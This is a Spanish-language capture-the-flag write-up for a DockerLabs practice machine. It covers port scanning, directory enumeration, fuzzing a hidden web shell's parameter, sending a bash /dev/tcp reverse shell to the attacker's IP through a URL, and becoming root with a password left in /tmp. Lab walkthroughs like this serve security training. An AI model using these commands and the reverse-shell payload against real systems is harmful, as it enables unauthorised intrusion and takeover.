# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/73c6b97a-2c28-4824-8baa-0aa424d9324c)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **80/tcp (HTTP):** Apache httpd 2.4.57 (Debian)
### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a una pagina de academia de ingles.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c3f101b7-baba-4264-831c-756d960d4ea4)


# Fase 2- Exploración

#### Tmp?
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6cb22334-9f1e-4a16-a819-1a3d94843f65)
Indagando en la pagina encuentro un mensaje que dice 
`¡Contáctanos hoy mismo para más información sobre nuestros programas de enseñanza de inglés!. Guardo un secretito en /tmp ;)`



#### Gobuster
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4203921f-ac2f-4b75-a21f-f33aff130b76)
Realizando un escaneo con Gobuster encontramos dos paginas interesantes: `warning.html` y `shell.php` 

#### Webshell?
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/98eddb85-3c67-4b25-9d18-510215a3b785)
Esto nos da una pista. Suponemos que el otro archivo (**shell.php**), tiene una estructura similar al archivo **cmd.php**  

Pero desconocemos el nombre del parámetro que se usa en **shell.php**. Es decir, el parámetro "**cmd**" para el ejemplo de arriba.

Lo que vamos a hacer es **Fuzzear** con un diccionario, para descubrir cuál es ese parámetro que nos da una respuesta. En este caso he decidido emplear **wfuzz**. Donde usamos 200 hilos ("-t 200") para ir muy rápido, un diccionario típico de directory-list la macro **FUZZ** que se reemplazará con las palabras de la lista especificada anteriormente. Es decir, estaremos tratando de ejecutar el comando **id** para cada parámetro posible en la url.

El comando: `wfuzz -c --hl=0 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"`

# Fase 3- Explotación

#### Parametrer?
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6343b0a9-74bf-4088-8f86-c309750af6b6)
Vemos que el parámetro -> "**parameter**" con el comando **id** que le hemos pasado, nos devuelve 2 líneas a diferencia del resto. Nos dirigimos a la web a comprobar que funciona y efectivamente hemos logrado un **RCE**. (Ejecución remota de comandos). Nos dirigimos a la web y lo comprobamos:

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/06e32832-d131-471e-ad96-338f69a23b78)

Funciono.

#### Revershell
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2ebfc158-c035-408d-be18-865f5aa30537)
Enviamos la revershell `http://172.17.0.2/shell.php?parameter=bash -c "bash -i >%26 /dev/tcp/192.168.52.143/443 0>%261"`
Los **"%26"** corresponden al símbolo **"&"** de forma URL-encodeada para que no den conflicto. Y siendo la **192.168.52.143 la **IP** de mi máquina atacante.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1fdae283-efd7-4096-848e-00e1f939e296)
Y ya estamos dentro.

# Fase 4- Privilegios
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ecd2726e-be31-4967-8794-ee04bd58c4f7)

Se realizo el tratamiento de la TTY Correspondiente.

#### Sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/eda3b8eb-d754-4952-89dd-77fc09efb7af)

El comando sudo -l no funciono, pero recordemos el mensaje del inicio del /tmp.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/7c28fc2e-7d8c-4556-9da1-59721b5e5377)

Al dirigirnos al directorio encontramos un archivo secret.txt que contiene la `contraseñaderoot123`

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/8448e512-3a43-496a-bd14-d3f49328afb5)

La introducimos y ya somos root!

